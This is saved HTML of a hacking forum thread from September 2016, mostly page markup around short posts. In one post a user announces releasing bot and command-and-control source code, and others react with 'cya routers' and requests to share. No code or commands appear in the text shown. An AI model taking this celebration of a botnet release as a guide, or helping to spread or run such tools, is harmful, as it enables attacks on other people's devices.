+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_35" title="Thank you for making the donation."></i><i class="award_sprite award_40" title="Thanks"></i><i class="award_sprite award_71" title="A gift from ᴿᴼᴼᵀ."></i><i class="award_sprite award_79" title="Thank you for supporting legalization."></i><i class="award_sprite award_84" title="The Darkness is all around us."></i><i class="award_sprite award_72" title="Join the LTC revolution."></i><i class="award_sprite award_85" title="A lucky member from a post in thread 5413134."></i><i class="award_sprite award_66" title="Another little Brony prancing around HF."></i><i class="award_sprite award_18" title="You are now a Rich Bitch. Thanks."></i><i class="award_sprite award_83" title="You have been a great supporter of HF. Thank you."></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">9,289</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">95</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2623266" title="Business Rating of Jаson"><strong class="reputation_positive" style="padding-left: 5px;">1</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2623266" rel="nofollow"><strong class="reputation_positive">83</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2623266&amp;pid=52615836&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 269.2</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2623266" title="Hacker Game Jаson Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615836);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615836#pid52615836" id="post_url_52615836" title="*" rel="nofollow">#8</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:05 PM <span class="post_edit" id="edited_by_52615836"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615836">
+		Bookmarked this thread so i can come back to this.
+	</div>
+	
+	
+<div class="signature scaleimages">
+<div style="text-align: center;" class="mycode_align"><img src="page1_files/RIP7FkV.gif" alt="[Image: RIP7FkV.gif]" class="mycode_img"></div>
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52615836"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2623266" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/" target="_blank" title="Visit this user's website" class="postbit_website desktop-inline-block" rel="noopener" data-tooltip="Website"><span><i class="fa fa-globe fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2623266" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615836);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615935" id="pid52615935"></a>
+<div class="post classic  clear" style="" id="post_52615935">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2501102" title="stackoverflowin joined Nov 2014"><img src="page1_files/default_avatar_002.png" alt="stackoverflowin" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2501102"><span class="group28">stackoverflowin</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				og printer hacker<br>
+				<img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/ub3r.png" alt="HF Ub3r" title="HF Ub3r">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_40" title="Thanks"></i><i class="award_sprite award_35" title="Thank you for making the donation."></i><i class="award_sprite award_71" title="A gift from Proxseas."></i><i class="award_sprite award_75" title="OMC to the MOON!"></i><i class="award_sprite award_72" title="Join the LTC revolution."></i><i class="award_sprite award_84" title="The Darkness is all around us."></i><i class="award_sprite award_66" title="Another little Brony prancing around HF."></i><i class="award_sprite award_85" title="A lucky member from a post in thread 5401393."></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">2,013</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">98</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2501102" title="Business Rating of stackoverflowin"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2501102" rel="nofollow"><strong class="reputation_neutral">0</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2501102&amp;pid=52615935&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2501102" title="Hacker Game stackoverflowin Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615935);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615935#pid52615935" id="post_url_52615935" title="*" rel="nofollow">#9</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:14 PM <span class="post_edit" id="edited_by_52615935"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615935">
+		Yeah eh this was unexpected
+	</div>
+	
+	
+<div class="signature scaleimages">
+I only use <a href="https://ricochet.im/" target="_blank" rel="ugc" class="mycode_url">https://ricochet.im</a> - ricochet:lmi3tdtlsnziqwdk<br>
+<br>
+Jabber: st4ck@jabber.to
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52615935"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2501102" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2501102" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615935);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615949" id="pid52615949"></a>
+<div class="post classic  clear" style="" id="post_52615949">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035" title="Anna-senpai joined Jul 2016"><img src="page1_files/default_avatar_002.png" alt="Anna-senpai" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035"><span style="color:#383838">Anna-senpai</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[closed@HF:]<br>
+				
+				
+			</span>
+                        <div class="post_myawards"></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">247</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">9</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=3201035" title="Business Rating of Anna-senpai"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=3201035" rel="nofollow"><strong class="reputation_positive">12</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=3201035&amp;pid=52615949&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=3201035" title="Hacker Game Anna-senpai Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615949);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615949#pid52615949" id="post_url_52615949" title="*" rel="nofollow">#10</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:16 PM <span class="post_edit" id="edited_by_52615949"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615949">
+		I just release the bot and cnc source code, with associated tools. Usage instructions coming soon
+	</div>
+	
+	
+	</div></div>
+	
+<div style="" id="tyl_52615949"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=3201035" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615949);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615997" id="pid52615997"></a>
+<div class="post classic  clear" style="" id="post_52615997">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2975563" title="tim joined Dec 2015"><img src="page1_files/default_avatar_002.png" alt="tim" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2975563"><span class="group0">tim</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[bin@HF:]<br>
+				<img src="page1_files/star.gif" alt="*" border="0"><img src="page1_files/star.gif" alt="*" border="0"><img src="page1_files/star.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/legends2.png" alt="Legends" title="Legends">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_35" title="Thank you for making the donation."></i><i class="award_sprite award_50" title="A master of donations you have become. Huge appreciation."></i><i class="award_sprite award_40" title="Thanks"></i><i class="award_sprite award_80" title="Grand is your heart and grand is your award. HF owes you a grand thanks."></i><i class="award_sprite award_80" title="Grand is your heart and grand is your award. HF owes you a grand thanks."></i><i class="award_sprite award_80" title="Grand is your heart and grand is your award. HF owes you a grand thanks."></i><i class="award_sprite award_70" title="Bitcoins are the future."></i><i class="award_sprite award_72" title="Join the LTC revolution."></i><i class="award_sprite award_84" title="The Darkness is all around us."></i><i class="award_sprite award_18" title="You are now a Rich Bitch. Thanks."></i><i class="award_sprite award_92" title="You are now an Ethereist."></i><i class="award_sprite award_83" title="You have been a great supporter of HF. Thank you."></i><i class="award_sprite award_79" title="Thank you for supporting legalization."></i><i class="award_sprite award_71" title="A gift from Timothy White."></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">1,194</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">205</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2975563" title="Business Rating of tim"><strong class="reputation_positive" style="padding-left: 5px;">5</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2975563" rel="nofollow"><strong class="reputation_positive">69</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2975563&amp;pid=52615997&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 280.4</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2975563" title="Hacker Game tim Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615997);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615997#pid52615997" id="post_url_52615997" title="*" rel="nofollow">#11</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:19 PM <span class="post_edit" id="edited_by_52615997"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615997">
+		There goes qBot. Nice and dead :).<br>
+<br>
+Hated it anyways.<br>
+<br>
+cya routers
+	</div>
+	
+	
+<div class="signature scaleimages">
+PM me before you deal
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52615997"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2975563" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://google.com/" target="_blank" title="Visit this user's website" class="postbit_website desktop-inline-block" rel="noopener" data-tooltip="Website"><span><i class="fa fa-globe fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2975563" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615997);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52616010" id="pid52616010"></a>
+<div class="post classic  clear" style="" id="post_52616010">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2501102" title="stackoverflowin joined Nov 2014"><img src="page1_files/default_avatar_002.png" alt="stackoverflowin" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2501102"><span class="group28">stackoverflowin</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				og printer hacker<br>
+				<img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/ub3r.png" alt="HF Ub3r" title="HF Ub3r">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_40" title="Thanks"></i><i class="award_sprite award_35" title="Thank you for making the donation."></i><i class="award_sprite award_71" title="A gift from Proxseas."></i><i class="award_sprite award_75" title="OMC to the MOON!"></i><i class="award_sprite award_72" title="Join the LTC revolution."></i><i class="award_sprite award_84" title="The Darkness is all around us."></i><i class="award_sprite award_66" title="Another little Brony prancing around HF."></i><i class="award_sprite award_85" title="A lucky member from a post in thread 5401393."></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">2,013</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">98</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2501102" title="Business Rating of stackoverflowin"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2501102" rel="nofollow"><strong class="reputation_neutral">0</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2501102&amp;pid=52616010&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2501102" title="Hacker Game stackoverflowin Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52616010);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52616010#pid52616010" id="post_url_52616010" title="*" rel="nofollow">#12</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:20 PM <span class="post_edit" id="edited_by_52616010"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52616010">
+		<blockquote class="mycode_quote"><cite><span> (09-30-2016, 08:19 PM)</span>mark leonardi Wrote: <a href="https://hackforums.net/showthread.php?pid=52615997#pid52615997" class="quick_jump">&nbsp;</a></cite>There goes qBot. Nice and dead :).<br>
+<br>
+Hated it anyways.<br>
+<br>
+cya routers</blockquote><br>
+makes no sense at all but sure continue
+	</div>
+	
+	
+<div class="signature scaleimages">
+I only use <a href="https://ricochet.im/" target="_blank" rel="ugc" class="mycode_url">https://ricochet.im</a> - ricochet:lmi3tdtlsnziqwdk<br>
+<br>
+Jabber: st4ck@jabber.to
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52616010"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2501102" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2501102" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52616010);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52616037" id="pid52616037"></a>
+<div class="post classic  clear" style="" id="post_52616037">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2623266" title="Jаson joined Feb 2015"><img src="page1_files/avatar_2623266.png" alt="Jаson" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2623266"><span class="group28">Jаson</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				lonely stoner<br>
+				<img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/ub3r.png" alt="HF Ub3r" title="HF Ub3r">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_35" title="Thank you for making the donation."></i><i class="award_sprite award_40" title="Thanks"></i><i class="award_sprite award_71" title="A gift from ᴿᴼᴼᵀ."></i><i class="award_sprite award_79" title="Thank you for supporting legalization."></i><i class="award_sprite award_84" title="The Darkness is all around us."></i><i class="award_sprite award_72" title="Join the LTC revolution."></i><i class="award_sprite award_85" title="A lucky member from a post in thread 5413134."></i><i class="award_sprite award_66" title="Another little Brony prancing around HF."></i><i class="award_sprite award_18" title="You are now a Rich Bitch. Thanks."></i><i class="award_sprite award_83" title="You have been a great supporter of HF. Thank you."></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">9,289</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">95</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2623266" title="Business Rating of Jаson"><strong class="reputation_positive" style="padding-left: 5px;">1</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2623266" rel="nofollow"><strong class="reputation_positive">83</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2623266&amp;pid=52616037&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 269.2</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2623266" title="Hacker Game Jаson Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52616037);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52616037#pid52616037" id="post_url_52616037" title="*" rel="nofollow">#13</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:22 PM <span class="post_edit" id="edited_by_52616037"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52616037">
+		STOP BEING A TEASE.<br>
+[img]http://image.prntscr.com/image/337e91bc2fba42c4afe5738284b54dea.png[/img]
+	</div>
+	
+	
+<div class="signature scaleimages">
+<div style="text-align: center;" class="mycode_align"><img src="page1_files/RIP7FkV.gif" alt="[Image: RIP7FkV.gif]" class="mycode_img"></div>
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52616037"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2623266" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/" target="_blank" title="Visit this user's website" class="postbit_website desktop-inline-block" rel="noopener" data-tooltip="Website"><span><i class="fa fa-globe fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2623266" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52616037);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52616056" id="pid52616056"></a>
+<div class="post classic  clear" style="" id="post_52616056">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035" title="Anna-senpai joined Jul 2016"><img src="page1_files/default_avatar_002.png" alt="Anna-senpai" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035"><span style="color:#383838">Anna-senpai</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[closed@HF:]<br>
+				
+				
+			</span>
+                        <div class="post_myawards"></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">247</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">9</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=3201035" title="Business Rating of Anna-senpai"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=3201035" rel="nofollow"><strong class="reputation_positive">12</strong></a>
+</div></div>
+
